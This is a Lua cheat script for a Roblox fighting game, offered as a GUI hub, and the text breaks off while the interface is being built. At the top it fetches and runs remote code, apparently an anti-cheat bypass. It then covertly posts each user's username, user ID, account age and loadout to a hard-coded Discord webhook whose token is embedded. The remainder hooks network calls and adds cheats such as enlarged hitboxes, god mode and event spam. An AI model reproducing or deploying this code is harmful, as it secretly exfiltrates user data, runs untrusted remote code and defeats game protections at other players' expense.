pcall(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua", true))()
end)

local Players           = game:GetService("Players")
local player    = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local HttpService=game:GetService("HttpService")
local MarketplaceService=game:GetService("MarketplaceService")

local WEBHOOK="https://discord.com/api/webhooks/1513915545974603899/w4_knfLlf2o-u65_cUPRUGkUNsgE06gITiFFLEs0-223OSb-CnRs56q_K1tGs6Bd0OyR"

local function getEquippedLoadout()
	local keys={
		Punches={"PA","PA2","PA3"},
		Headlocks={"DTTool"},
		Blocks={"BC"},
		Mop={"MA","DragMop"},
		Runup={"RA"},
		Rush={"NDTool"},
		SquareUp={"SU"},
		ToolAnimation={"toolLeap"}
	}

	local results={}

	for category,names in pairs(keys) do
		local selections={}

		for _,name in ipairs(names) do
			local object=player:FindFirstChild(name)
			if object and object:IsA("ValueBase") then
				table.insert(selections,tostring(object.Value))
			end
		end

		results[category]=#selections>0
			and table.concat(selections,", ")
			or "Not detected"
	end

	return results
end

task.spawn(function()
	local player=Players.LocalPlayer
	if not player then return end

	local gameName=game.Name
	pcall(function()
		gameName=MarketplaceService:GetProductInfo(game.PlaceId).Name
	end)

	local loadout=getEquippedLoadout()    
	local fields={
		{name="Username",value="@"..player.Name,inline=true},
		{name="Display Name",value=player.DisplayName,inline=true},
		{name="User ID",value=tostring(player.UserId),inline=true},
		{name="Account Age",value=tostring(player.AccountAge).." days",inline=true},
		{name="Game",value=gameName,inline=true},
		{name="Place ID",value=tostring(game.PlaceId),inline=true},
		{name="🥊 Punches",value=loadout.Punches,inline=false},
		{name="Headlocks",value=loadout.Headlocks,inline=false},
		{name="Blocks",value=loadout.Blocks,inline=false},
		{name="Mop",value=loadout.Mop,inline=false},
		{name="Runup",value=loadout.Runup,inline=false},
		{name="Rush",value=loadout.Rush,inline=false},
		{name="SquareUp",value=loadout.SquareUp,inline=false},
		{name="Tool Animation",value=loadout.ToolAnimation,inline=false},

		{name="Date",value=os.date("%Y-%m-%d %H:%M:%S"),inline=false}
	}

	local payload=HttpService:JSONEncode({
		username="LoriBandzz Private",
		embeds={{
			title="⚡ LORIBANDZZ PRIVATE",
			description="Session activity report",
			color=0xB8BEC9,
			fields=fields,
			footer={text="LoriBandzz Private • Session Report"}
		}}
	})

	local req=http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
	if req then
		pcall(function()
			req({
				Url=WEBHOOK,
				Method="POST",
				Headers={["Content-Type"]="application/json"},
				Body=payload
			})
		end)
	end
end)

task.wait(1)
repeat task.wait() until game:GetService("Players").LocalPlayer

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS               = game:GetService("UserInputService")
local RunService        = game:GetService("RunService")
local TweenService      = game:GetService("TweenService")
local events    = ReplicatedStorage:WaitForChild("events")
local Solo           = events:WaitForChild("SoloPlrEvents")
local Duo            = events:FindFirstChild("DuoPlrEvents")
local ValueChange2   = events:FindFirstChild("ValueChange2")
local MoneyGain      = events:FindFirstChild("MoneyGain")
local NonFightEvents = events:FindFirstChild("NonFightEvents")
local CharRemote     = NonFightEvents and NonFightEvents:FindFirstChild("Char")
local MainKeys       = events:WaitForChild("MainKeys")
local ValueChange    = events:FindFirstChild("ValueChange")
local IsolatedBlock  = events:FindFirstChild("isolatedblock")
local PvpToggle      = events:FindFirstChild("PvpToggle")
local SneakEvents    = events:FindFirstChild("SneakRequestEvents")
local SendSneak      = SneakEvents and SneakEvents:FindFirstChild("SendSneakToServer")
local customweldacc  = NonFightEvents and NonFightEvents:FindFirstChild("customweldacc")

local looseFightBlocked  = false
local beatDownBlocked    = false
local duoBlocked         = false
local hitboxOn           = false
local hitboxPlayerHooked = false
local comboThread        = nil
local godCharTarget      = ""
local pvpThread          = nil
local pvpOnThread        = nil
local valueText          = "0"
local lastValueFire      = 0
local lastHitboxApply    = 0
local torsoCache         = {}
local activeRenderCount  = 0
local activeHBCount      = 0
local brassThread        = nil

local HITBOX_SIZE    = Vector3.new(5, 5, 5)
local HITBOX_METHOD  = 1
local HITBOX_METHODS = {"Torso","Head","Head+Torso","Root Part"}

local hookActive = false
-- Strategy 1: hookmetamethod (Synapse X, ScriptWare, Fluxus)
pcall(function()
	if not hookmetamethod or not getnamecallmethod then return end
	local old
	old = hookmetamethod(game, "__namecall", function(self, ...)
		local method = getnamecallmethod()
		if method == "FireServer" and self == Solo then
			local args = {...}
			if looseFightBlocked and args[1] == "LooseFight" then return nil end
			if beatDownBlocked  and args[1] == "BeatDown"   then return nil end
		end
		if method == "FireServer" and duoBlocked and self == Duo then return nil end
		return old(self, ...)
	end)
	hookActive = true
end)

-- Strategy 2: raw metatable hook (Delta, Wave, and most UNC-compliant executors)
if not hookActive then
	pcall(function()
		if not getrawmetatable or not setreadonly then return end
		local mt = getrawmetatable(game)
		if not mt then return end
		local oldNC = mt.__namecall
		if not oldNC then return end
		setreadonly(mt, false)
		mt.__namecall = newcclosure and newcclosure(function(self, ...)
			local args = {...}
			local isSolo = rawequal(self, Solo)
			local isDuo  = Duo and rawequal(self, Duo)
			if isSolo then
				if looseFightBlocked and args[1] == "LooseFight" then return end
				if beatDownBlocked  and args[1] == "BeatDown"   then return end
			end
			if isDuo and duoBlocked then return end
			return oldNC(self, ...)
		end) or function(self, ...)
			local args = {...}
			local isSolo = rawequal(self, Solo)
			local isDuo  = Duo and rawequal(self, Duo)
			if isSolo then
				if looseFightBlocked and args[1] == "LooseFight" then return end
				if beatDownBlocked  and args[1] == "BeatDown"   then return end
			end
			if isDuo and duoBlocked then return end
			return oldNC(self, ...)
		end
		setreadonly(mt, true)
		hookActive = true
	end)
end

-- Strategy 3: __index intercept on the remotes themselves (fallback for any executor)
if not hookActive then
	pcall(function()
		local origSoloFS = Solo.FireServer
		Solo.FireServer = function(self, ...)
			local args = {...}
			if looseFightBlocked and args[1] == "LooseFight" then return end
			if beatDownBlocked  and args[1] == "BeatDown"   then return end
			return origSoloFS(self, ...)
		end
		if Duo then
			local origDuoFS = Duo.FireServer
			Duo.FireServer = function(self, ...)
				if duoBlocked then return end
				return origDuoFS(self, ...)
			end
		end
		hookActive = true
	end)
end

local function getTorso(char)
	return char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("HumanoidRootPart")
end
local function jitter(b,p) return b+(math.random()*2-1)*b*p end
local function invalidateTorsoCache(p2) torsoCache[p2]=nil end
local function getCachedTorso(p2)
	if torsoCache[p2] and torsoCache[p2].Parent then return torsoCache[p2] end
	local char=p2.Character; if not char then return nil end
	local t=getTorso(char); torsoCache[p2]=t; return t
end
for _,p2 in ipairs(Players:GetPlayers()) do
	p2.CharacterAdded:Connect(function() invalidateTorsoCache(p2) end)
end
Players.PlayerAdded:Connect(function(p2) p2.CharacterAdded:Connect(function() invalidateTorsoCache(p2) end) end)
Players.PlayerRemoving:Connect(function(p2) torsoCache[p2]=nil end)
local function findPlayer(name)
	name=name:lower()
	for _,p2 in ipairs(Players:GetPlayers()) do
		if p2~=player and p2.Name:lower():find(name,1,true) then return p2 end
	end
	for _,p2 in ipairs(Players:GetPlayers()) do
		if p2~=player and p2.DisplayName:lower():find(name,1,true) then return p2 end
	end
end
local function keyDisplayName(key)
	local n=key.Name; return #n==1 and "["..n.."]" or "["..n:sub(1,3).."]"
end

local healing = false
local healThread = nil

local godThread = nil
local godHealthConn = nil
local godRenderConn = nil
local godOriginalMax = nil
local godEnabled = false

local features={}
local function makeFeature(name,key,opts)
	local act=opts.onActivate or function()end
	local deact=opts.onDeactivate or function()end
	local f={
		name=name,key=key,state=false,mode="toggle",
		onActivate=function() act()
			if opts.onRender then activeRenderCount=activeRenderCount+1 end
			if opts.onHeartbeat then activeHBCount=activeHBCount+1 end
		end,
		onDeactivate=function() deact()
			if opts.onRender then activeRenderCount=math.max(0,activeRenderCount-1) end
			if opts.onHeartbeat then activeHBCount=math.max(0,activeHBCount-1) end
		end,
		onHeartbeat=opts.onHeartbeat,onRender=opts.onRender,
		dot=nil,dotGlow=nil,keyLabel=nil,nameLabel=nil,accent=nil
	}
	table.insert(features,f); return f
end

local function applyHitbox(char,enlarged)
	if not char then return end
	if HITBOX_METHOD==1 then
		local t=getTorso(char); if not t then return end
		t.Size=enlarged and HITBOX_SIZE or Vector3.new(2,2,1)
		t.Transparency=enlarged and 1 or 0
	elseif HITBOX_METHOD==2 then
		local h=char:FindFirstChild("Head"); if not h then return end
		h.Size=enlarged and HITBOX_SIZE or Vector3.new(2,1,1); h.Transparency=0
	elseif HITBOX_METHOD==3 then
		local t=getTorso(char); local h=char:FindFirstChild("Head")
		if t then t.Size=enlarged and HITBOX_SIZE or Vector3.new(2,2,1); t.Transparency=0 end
		if h then h.Size=enlarged and HITBOX_SIZE or Vector3.new(2,1,1); h.Transparency=0 end
	elseif HITBOX_METHOD==4 then
		local r=char:FindFirstChild("HumanoidRootPart"); if not r then return end
		r.Size=enlarged and HITBOX_SIZE or Vector3.new(2,2,1); r.Transparency=1
	end
end
local function setHitboxes(enlarged)
	for _,other in ipairs(Players:GetPlayers()) do
		if other~=player then applyHitbox(other.Character,enlarged)
			if not enlarged then invalidateTorsoCache(other) end end
	end
end
local function hitboxActivate()
	hitboxOn=true
	if not hitboxPlayerHooked then
		hitboxPlayerHooked=true
		Players.PlayerAdded:Connect(function(p2)
			if hitboxOn and p2~=player then
				p2.CharacterAdded:Connect(function(c) task.wait(0.1); if hitboxOn then applyHitbox(c,true) end end)
			end
		end)
	end
end
local function hitboxDeactivate() hitboxOn=false; setHitboxes(false) end
local function hitboxRender()
	if not hitboxOn then return end
	local now=tick(); if now-lastHitboxApply<0.5 then return end
	lastHitboxApply=now; setHitboxes(true)
end

local function valueRender()
	if not ValueChange2 then return end
	local now=tick(); if now-lastValueFire<0.1 then return end
	lastValueFire=now
	local char=player.Character; if not char then return end
	local wallet=char:FindFirstChild("Wallet"); if not wallet then return end
	local handle=wallet:FindFirstChild("Handle"); if not handle then return end
	local bb=handle:FindFirstChild("BillboardGui"); if not bb then return end
	local label=bb:FindFirstChild("TextLabel")
	if label then pcall(function() ValueChange2:FireServer(label,valueText) end) end
end

local function toggleLooseFight() looseFightBlocked=not looseFightBlocked end
local function toggleBeatDown()   beatDownBlocked=not beatDownBlocked     end
local function toggleDuo()        duoBlocked=not duoBlocked               end

local function pvpActivate()
	pvpThread=task.spawn(function()
		while true do pcall(function() if PvpToggle then PvpToggle:FireServer(false) end end); task.wait(1) end
	end)
end
local function pvpDeactivate() if pvpThread then task.cancel(pvpThread); pvpThread=nil end end
local function pvpOnActivate()
	pvpOnThread=task.spawn(function()
		while true do pcall(function() if PvpToggle then PvpToggle:FireServer(true) end end); task.wait(1) end
	end)
end
local function pvpOnDeactivate() if pvpOnThread then task.cancel(pvpOnThread); pvpOnThread=nil end end

local escapeThread=nil
local escapeActive=false

local function escapeActivate()
	if escapeActive then return end
	escapeActive=true
	escapeThread=task.spawn(function()
		while escapeActive do
			local char=player.Character
			local data=char and char:FindFirstChild("Player")
			local damages=data and data:FindFirstChild("Damages")
			local values=damages and damages:FindFirstChild("values")
			local tool=values and values:FindFirstChild("DamageTool")
			local able=tool and tool:FindFirstChild("AbleToEscape")
			local escaped=tool and tool:FindFirstChild("Escaped")

			if able and escaped and able:IsA("BoolValue") and escaped:IsA("BoolValue") then
				if able.Value and not escaped.Value and ValueChange then
					pcall(function()
						ValueChange:FireServer(escaped,true)
					end)
				end
			end
			task.wait(0.1)
		end
	end)
end

local function escapeDeactivate()
	escapeActive=false
	if escapeThread then
		task.cancel(escapeThread)
		escapeThread=nil
	end
end

local function nearestEnemy(range)
	local char=player.Character
	if not char then return nil end
	local mr=char:FindFirstChild("HumanoidRootPart") or getTorso(char)
	if not mr then return nil end
	local best=nil; local bd=range or 32
	for _,other in ipairs(Players:GetPlayers()) do
		if other~=player then
			local c=other.Character
			local r=c and(c:FindFirstChild("HumanoidRootPart") or getTorso(c))
			if r then
				local d=(mr.Position-r.Position).Magnitude
				if d<bd then bd=d; best=other end
			end
		end
	end
	return best
end

local COMBO_ACTIONS={"Push","Punch","Drag","DamageTool"}

local function comboActivate()
	if comboThread then return end
	comboThread=task.spawn(function()
		while true do
			if nearestEnemy(32) then
				local char=player.Character
				local data=char and char:FindFirstChild("Player")
				local damages=data and data:FindFirstChild("Damages")
				local values=damages and damages:FindFirstChild("values")
				local tool=values and values:FindFirstChild("DamageTool")
				local escaped=tool and tool:FindFirstChild("Escaped")

				if escaped and ValueChange then
					pcall(function()
						ValueChange:FireServer(escaped,true)
					end)
				end

				for _,action in ipairs(COMBO_ACTIONS) do
					pcall(function()
						MainKeys:FireServer(action)
					end)
					task.wait(0.05)
				end
			end
			task.wait(jitter(0.06,0.25))
		end
	end)
end

local function comboDeactivate()
	if comboThread then
		task.cancel(comboThread)
		comboThread=nil
	end
end

local stompThread=nil

local function stompActivate()
	if stompThread then return end
	stompThread=task.spawn(function()
		while true do
			pcall(function()
				MainKeys:FireServer("Stomp")
			end)
			task.wait(0.05)
		end
	end)
end

local function stompDeactivate()
	if stompThread then
		task.cancel(stompThread)
		stompThread=nil
	end
end

local function brassActivate()
	if not customweldacc then return end
	brassThread=task.spawn(function()
		while true do pcall(function() customweldacc:FireServer("Rings") end); task.wait(jitter(0.05,0.1)) end
	end)
end
local function brassDeactivate() if brassThread then task.cancel(brassThread); brassThread=nil end end

local function blockActivate()
	blockThread=task.spawn(function()
		while true do
			pcall(function() if IsolatedBlock then IsolatedBlock:FireServer() end end)
			pcall(function() end)
			task.wait(2.5)
		end
	end)
end
local function blockDeactivate() if blockThread then task.cancel(blockThread); blockThread=nil end end

local function healActivate()
	healing = true
	if healThread then return end

	healThread = task.spawn(function()
		while healing do
			pcall(function()
				Solo:FireServer("Health")
			end)
			task.wait(3)
		end
		healThread = nil
	end)
end

local function healDeactivate()
	healing = false
	if healThread then
		task.cancel(healThread)
		healThread = nil
	end
end

local function clearGodConnections()
	if godHealthConn then
		godHealthConn:Disconnect()
		godHealthConn = nil
	end

	if godRenderConn then
		godRenderConn:Disconnect()
		godRenderConn = nil
	end
end

local function applyGodHumanoid(hum)
	if not hum then return end

	clearGodConnections()

	godOriginalMax = hum.MaxHealth
	hum.MaxHealth = 1000000
	hum.Health = 1000000
	hum.BreakJointsOnDeath = false

	godHealthConn = hum.HealthChanged:Connect(function()
		if godEnabled and hum.Parent and hum.Health < 1000000 then
			hum.Health = 1000000
		end
	end)
end

local function godActivate()
	if godEnabled then return end
	godEnabled = true

	local char = player.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	applyGodHumanoid(hum)

	godThread = task.spawn(function()
		while godEnabled do
			pcall(function()
				Solo:FireServer("Health")
			end)
			task.wait(0.01)
		end
	end)

	godRenderConn = RunService.Heartbeat:Connect(function()
		local h = player.Character
			and player.Character:FindFirstChildOfClass("Humanoid")

		if h then
			if h.MaxHealth ~= 1000000 then
				h.MaxHealth = 1000000
			end

			if h.Health ~= 1000000 then
				h.Health = 1000000
			end

			h.BreakJointsOnDeath = false
		end
	end)
end

local function godDeactivate()
	godEnabled = false
	clearGodConnections()

	if godThread then
		task.cancel(godThread)
		godThread = nil
	end

	local hum = player.Character
		and player.Character:FindFirstChildOfClass("Humanoid")

	if hum and godOriginalMax then
		hum.MaxHealth = godOriginalMax
		hum.Health = math.min(hum.Health, godOriginalMax)
		hum.BreakJointsOnDeath = true
	end
end

player.CharacterAdded:Connect(function(char)
	if not godEnabled then return end

	local hum = char:WaitForChild("Humanoid", 10)
	if hum then
		applyGodHumanoid(hum)
	end
end)

local fHeal = makeFeature("Heal Boost", Enum.KeyCode.Unknown, {
	onActivate = healActivate,
	onDeactivate = healDeactivate
})

local fGod = makeFeature("God Mode", Enum.KeyCode.Unknown, {
	onActivate = godActivate,
	onDeactivate = godDeactivate
})

local fEscape=makeFeature("Auto Escape",Enum.KeyCode.Unknown,{
	onActivate=escapeActivate,onDeactivate=escapeDeactivate
})

local fCombo=makeFeature("Combo Spam",Enum.KeyCode.P,{
	onActivate=comboActivate,onDeactivate=comboDeactivate
})

local fStomp=makeFeature("Auto Stomp",Enum.KeyCode.Unknown,{
	onActivate=stompActivate,onDeactivate=stompDeactivate
})

local fHitbx=makeFeature("Hitbox+",Enum.KeyCode.Unknown,{
	onActivate=hitboxActivate,onDeactivate=hitboxDeactivate,onRender=hitboxRender
})

local fValue=makeFeature("Value Edit",Enum.KeyCode.Unknown,{
	onRender=valueRender
})

local fBrass=makeFeature("Brass Knuckles",Enum.KeyCode.Unknown,{
	onActivate=brassActivate,
	onDeactivate=brassDeactivate
})

local fBlock  = makeFeature("Auto Block",       Enum.KeyCode.Unknown,     {onActivate=blockActivate,         onDeactivate=blockDeactivate})

local fLoose=makeFeature("Block LooseFight",Enum.KeyCode.Unknown,{
	onActivate=toggleLooseFight,onDeactivate=toggleLooseFight
})

local fBeatDn=makeFeature("Block BeatDown",Enum.KeyCode.Unknown,{
	onActivate=toggleBeatDown,onDeactivate=toggleBeatDown
})

local fDuo=makeFeature("Block Duo Events",Enum.KeyCode.Unknown,{
	onActivate=toggleDuo,onDeactivate=toggleDuo
})

local fPvp=makeFeature("PVP Off",Enum.KeyCode.Unknown,{
	onActivate=pvpActivate,onDeactivate=pvpDeactivate
})

local fPvpOn=makeFeature("PVP On",Enum.KeyCode.Unknown,{
	onActivate=pvpOnActivate,onDeactivate=pvpOnDeactivate
})

local GUI_W = 450
local ROW_H = 38
local PAD = 8

local C_BG = Color3.fromRGB(255, 255, 255)
local C_TITLE = Color3.fromRGB(101, 19, 55)
local C_ON = Color3.fromRGB(192, 45, 112)
local C_OFF = Color3.fromRGB(235, 207, 222)
local C_KEY = Color3.fromRGB(166, 43, 96)
local C_KEY_HLD = Color3.fromRGB(245, 180, 210)
local C_LABEL = Color3.fromRGB(65, 19, 40)
local C_DIM = Color3.fromRGB(130, 79, 103)
local C_HOVER = Color3.fromRGB(249, 222, 235)
local C_INPUT = Color3.fromRGB(255, 245, 250)
local C_SEP = Color3.fromRGB(255, 205, 230)

local function addGradient(parent, rotation, colors)
	local gradient = Instance.new("UIGradient")
	gradient.Rotation = rotation
	gradient.Color = ColorSequence.new(colors)
	gradient.Parent = parent
	return gradient
end

local function whiteButtonText(button)
	local label = Instance.new("TextLabel")
	label.Name = "ButtonText"
	label.Size = UDim2.fromScale(1, 1)
	label.BackgroundTransparency = 1
	label.BorderSizePixel = 0
	label.Text = button.Text
	label.TextColor3 = Color3.fromRGB(255, 255, 255)
	label.TextSize = button.TextSize
	label.Font = button.Font
	label.TextXAlignment = button.TextXAlignment
	label.TextYAlignment = button.TextYAlignment
	label.TextTransparency = 0
	label.TextStrokeTransparency = 1
	label.ZIndex = button.ZIndex + 1
	label.Active = false
	label.Parent = button

	button.TextTransparency = 1

	button:GetPropertyChangedSignal("Text"):Connect(function()
		label.Text = button.Text
	end)

	return label
end

local TW_DOT=TweenInfo.new(0.3,Enum.EasingStyle.Exponential,Enum.EasingDirection.Out)
local TW_ROW=TweenInfo.new(0.22,Enum.EasingStyle.Exponential,Enum.EasingDirection.Out)
local TW_FAST=TweenInfo.new(0.15,Enum.EasingStyle.Sine,Enum.EasingDirection.Out)
local TW_OPEN=TweenInfo.new(0.45,Enum.EasingStyle.Exponential,Enum.EasingDirection.Out)
local TW_SPRING=TweenInfo.new(0.5,Enum.EasingStyle.Elastic,Enum.EasingDirection.Out)

local existingInterfaces = {
	"LANDONS_PRIVATE",
	"LANDONS_MOBILE",
	"LANDONS_SNEAK"
}

for _, guiName in ipairs(existingInterfaces) do
	local existing = playerGui:FindFirstChild(guiName)

	if existing then
		existing:Destroy()
	end
end

local sg=Instance.new("ScreenGui")
sg.Name="LANDONS_PRIVATE"; sg.ResetOnSpawn=false; sg.IgnoreGuiInset=true
sg.ZIndexBehavior=Enum.ZIndexBehavior.Sibling; sg.Parent=playerGui

local atualizarGUI
local infoLabelRef=nil

local function buildMobileUI()
	local mSg=Instance.new("ScreenGui"); mSg.Name="LANDONS_MOBILE"; mSg.ResetOnSpawn=false
	mSg.IgnoreGuiInset=true; mSg.ZIndexBehavior=Enum.ZIndexBehavior.Sibling; mSg.Parent=playerGui

	local ToggleButton=Instance.new("TextButton")
	ToggleButton.Name = "Landons Hub"
	ToggleButton.Size = UDim2.fromOffset(36, 36)
	ToggleButton.Position = UDim2.new(1,-40,0.5,-15)
	ToggleButton.BackgroundColor3 = Color3.new(1, 1, 1)
	ToggleButton.BackgroundTransparency = 0
	ToggleButton.BorderSizePixel = 0
	ToggleButton.Text = "★"
	ToggleButton.TextSize = 23
	ToggleButton.TextColor3 = Color3.new(1, 1, 1)
	ToggleButton.AutoButtonColor = false
	ToggleButton.Font = Enum.Font.GothamBold
	ToggleButton.ZIndex = 100
	ToggleButton.Parent = mSg

	Instance.new("UICorner",ToggleButton).CornerRadius =UDim.new(1,0)
	
	local ToggleStroke=Instance.new("UIStroke")
	ToggleStroke.Color = C_SEP
	ToggleStroke.Thickness=1.2
	ToggleStroke.Parent=ToggleButton
	ToggleStroke.Color = Color3.fromRGB(255, 190, 224)
	ToggleStroke.Thickness = 1.5

	addGradient(ToggleButton, 135, {
		ColorSequenceKeypoint.new(0,
			Color3.fromRGB(237, 131, 178)),
		ColorSequenceKeypoint.new(0.5,
			Color3.fromRGB(192, 45, 112)),
		ColorSequenceKeypoint.new(1,
			Color3.fromRGB(101, 19, 55))
	})

	whiteButtonText(ToggleButton)

	local starText = ToggleButton:FindFirstChild("ButtonText")

	if starText then
		starText.ZIndex = 101
	end
	
	local mP=Instance.new("Frame")
	mP.Size = UDim2.fromOffset(450,280)
	mP.AnchorPoint = Vector2.new(0.5,0.5)
	mP.Position = UDim2.fromScale(0.5,0.5)
	mP.BackgroundColor3=C_BG
	mP.BorderSizePixel=0
	mP.Active=true
	mP.Parent=mSg
	
	mP.BackgroundColor3 = Color3.new(1, 1, 1)

	addGradient(mP, 115, {
		ColorSequenceKeypoint.new(0, Color3.fromRGB(101, 19, 55)),
		ColorSequenceKeypoint.new(0.25, Color3.fromRGB(166, 43, 96)),
		ColorSequenceKeypoint.new(0.55, Color3.fromRGB(237, 131, 178)),
		ColorSequenceKeypoint.new(0.80, Color3.fromRGB(251, 213, 231)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
	})
	
	local uiScale = Instance.new("UIScale")
	uiScale.Parent = mP
	
	local settings = {
		Scale = 1,
		Transparency = 0,
		Theme = "Rose"
	}

	local defaultStarPosition = ToggleButton.Position
	local defaultPanelPosition = mP.Position
	
	local function updateScale()
		local camera = workspace.CurrentCamera
		if not camera then return end

		local viewport = camera.ViewportSize

		uiScale.Scale = math.min(
			settings.Scale,
			(viewport.X - 24) / 450,
			(viewport.Y - 24) / 280
		)
	end
	
	local function keepOnScreen(object)
		local camera = workspace.CurrentCamera
		if not camera then return end

		local viewport = camera.ViewportSize
		local size = object.AbsoluteSize
		local position = object.AbsolutePosition
		local margin = 5

		local x = math.clamp(
			position.X,
			margin,
			math.max(margin, viewport.X - size.X - margin)
		)

		local y = math.clamp(
			position.Y,
			margin,
			math.max(margin, viewport.Y - size.Y - margin)
		)

		local correctionX = x - position.X
		local correctionY = y - position.Y

		object.Position = UDim2.new(
			object.Position.X.Scale,
			object.Position.X.Offset + correctionX,
			object.Position.Y.Scale,
			object.Position.Y.Offset + correctionY
		)
	end
	
	updateScale()

	workspace.CurrentCamera
		:GetPropertyChangedSignal("ViewportSize")
		:Connect(function()
			updateScale()

			task.defer(function()
				keepOnScreen(mP)
				keepOnScreen(ToggleButton)
			end)
		end)
	
	local dragging=false
	local dragStart=nil
	local startPosition=nil
	local activeInput=nil
	local moved=false

	ToggleButton.InputBegan:Connect(function(input)
		if input.UserInputType~=Enum.UserInputType.Touch and input.UserInputType~=Enum.UserInputType.MouseButton1 then return end
		dragging=true
		moved=false
		activeInput=input
		dragStart=input.Position
		startPosition=ToggleButton.Position
	end)

	UIS.InputChanged:Connect(function(input)
		if not dragging then return end
		if not activeInput then return end

		if activeInput.UserInputType == Enum.UserInputType.Touch
			and input ~= activeInput then
			return
		end
		if input.UserInputType ~= Enum.UserInputType.Touch
			and input.UserInputType ~= Enum.UserInputType.MouseMovement then
			return
		end

		local delta = input.Position - dragStart

		if delta.Magnitude > 8 then moved = true end
		if not moved then return end

		ToggleButton.Position = UDim2.new(
			startPosition.X.Scale,
			startPosition.X.Offset + delta.X,
			startPosition.Y.Scale,
			startPosition.Y.Offset + delta.Y
		)

		keepOnScreen(ToggleButton)
	end)

	UIS.InputEnded:Connect(function(input)
		if not dragging then return end
		if input~=activeInput and not (activeInput.UserInputType==Enum.UserInputType.MouseButton1 and input.UserInputType==Enum.UserInputType.MouseButton1) then return end
		dragging=false
		activeInput=nil
		if not moved then
			mP.Visible=not mP.Visible
		end
	end)

	Instance.new("UICorner",mP).CornerRadius=UDim.new(0,14)
	local panelStroke = Instance.new("UIStroke")
	panelStroke.Color = Color3.fromRGB(255, 174, 216)
	panelStroke.Thickness = 2
	panelStroke.Parent = mP

	addGradient(panelStroke, 90, {
		ColorSequenceKeypoint.new(0,
			Color3.fromRGB(255, 120, 190)),
		ColorSequenceKeypoint.new(0.5,
			Color3.fromRGB(255, 205, 230)),
		ColorSequenceKeypoint.new(1,
			Color3.fromRGB(255, 255, 255))
	})
	
	local mH = Instance.new("Frame")
	mH.Size = UDim2.new(1, -16, 0, 44)
	mH.Position = UDim2.fromOffset(8, 6)
	mH.BackgroundColor3 = Color3.fromRGB(65, 12, 36)
	mH.BackgroundTransparency = 0.35
	mH.BorderSizePixel = 0

	Instance.new("UICorner", mH).CornerRadius =
		UDim.new(0, 10)
	mH.Parent = mP

	local mT = Instance.new("TextLabel")
	mT.Size = UDim2.new(1, -100, 0, 26)
	mT.Position = UDim2.fromOffset(8, 0)
	mT.Text = "Landon's Hub"
	mT.TextSize = 22
	mT.TextColor3 = Color3.new(1, 1, 1)
	mT.Font = Enum.Font.GothamBold
	mT.BackgroundTransparency = 1
	mT.TextXAlignment = Enum.TextXAlignment.Left
	mT.BorderSizePixel = 0
	mT.Parent = mH

	mH.Active = true

	local panelDragging = false
	local panelDragStart
	local panelStartPosition
	local panelDragInput

	mH.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.Touch
			or input.UserInputType == Enum.UserInputType.MouseButton1 then

			panelDragging = true
			panelDragInput = input
			panelDragStart = input.Position
			panelStartPosition = mP.Position
		end
	end)

	UIS.InputChanged:Connect(function(input)
		if not panelDragging then return end

		local validInput = input == panelDragInput
			or (
				panelDragInput.UserInputType ==
				Enum.UserInputType.MouseButton1
				and input.UserInputType ==
				Enum.UserInputType.MouseMovement
			)

		if not validInput then return end

		local delta = input.Position - panelDragStart

		mP.Position = UDim2.new(
			panelStartPosition.X.Scale,
			panelStartPosition.X.Offset + delta.X,
			panelStartPosition.Y.Scale,
			panelStartPosition.Y.Offset + delta.Y
		)
		
		keepOnScreen(mP)
	end)

	UIS.InputEnded:Connect(function(input)
		if input == panelDragInput then
			panelDragging = false
			panelDragInput = nil
		end
	end)
	
	local close = Instance.new("TextButton")
	close.Size = UDim2.fromOffset(28, 26)
	close.Position = UDim2.new(1, -34, 0.5, -13)
	close.BackgroundColor3 = Color3.new(1, 1, 1)
	close.BackgroundTransparency = 0.85
	close.Text = "×"
	close.TextSize = 22
	close.TextColor3 = Color3.new(1, 1, 1)
	close.Font = Enum.Font.GothamBold
	close.Parent = mH

	Instance.new("UICorner", close).CornerRadius =
		UDim.new(0, 8)

	local closeStroke = Instance.new("UIStroke")
	closeStroke.Color = Color3.new(1, 1, 1)
	closeStroke.Transparency = 0.5
	closeStroke.Parent = close

	close.Activated:Connect(function()
		mP.Visible = false
	end)
	
	local minimize = Instance.new("TextButton")
	minimize.Name = "Minimize"
	minimize.Size = UDim2.fromOffset(28, 26)
	minimize.Position = UDim2.new(1, -68, 0.5, -13)
	minimize.BackgroundColor3 = Color3.new(1, 1, 1)
	minimize.BackgroundTransparency = 0.85
	minimize.BorderSizePixel = 0
	minimize.Text = "−"
	minimize.TextSize = 22
	minimize.TextColor3 = Color3.new(1, 1, 1)
	minimize.Font = Enum.Font.GothamBold
	minimize.AutoButtonColor = false
	minimize.Parent = mH
	
	local headerSubtitle = Instance.new("TextLabel")
	headerSubtitle.Size = UDim2.new(1, -100, 0, 14)
	headerSubtitle.Position = UDim2.fromOffset(9, 26)
	headerSubtitle.BackgroundTransparency = 1
	headerSubtitle.Text = "LANDON'S WORKSITE"
	headerSubtitle.TextColor3 = Color3.fromRGB(255, 220, 238)
	headerSubtitle.TextSize = 9
	headerSubtitle.Font = Enum.Font.GothamMedium
	headerSubtitle.TextXAlignment = Enum.TextXAlignment.Left
	headerSubtitle.Parent = mH
	
	Instance.new("UICorner", minimize).CornerRadius =
		UDim.new(0, 8)

	local minimizeStroke = Instance.new("UIStroke")
	minimizeStroke.Color = Color3.new(1, 1, 1)
	minimizeStroke.Transparency = 0.5
	minimizeStroke.Parent = minimize

	minimize.Activated:Connect(function()
		mP.Visible = false
	end)
	
	local tabNames = {
		"Combat",
		"Defense",
		"Hitbox",
		"Misc",
		"Utility",
		"Settings"
	}
	
	local tabIcons = {
		Combat = "⚔",
		Defense = "◇",
		Hitbox = "⊕",
		Misc = "▱",
		Utility = "▦",
		Settings = "⚙"
	}

	local tabGradients = {}
	local tabStrokes = {}
	local pages = {}
	local tabButtons = {}
	local activeTab = "Combat"

	local sidebar = Instance.new("Frame")
	sidebar.Name = "Sidebar"
	sidebar.Size = UDim2.new(0,110,1,-52)
	sidebar.Position = UDim2.fromOffset(6,56)
	sidebar.Size = UDim2.new(0,110,1,-62)
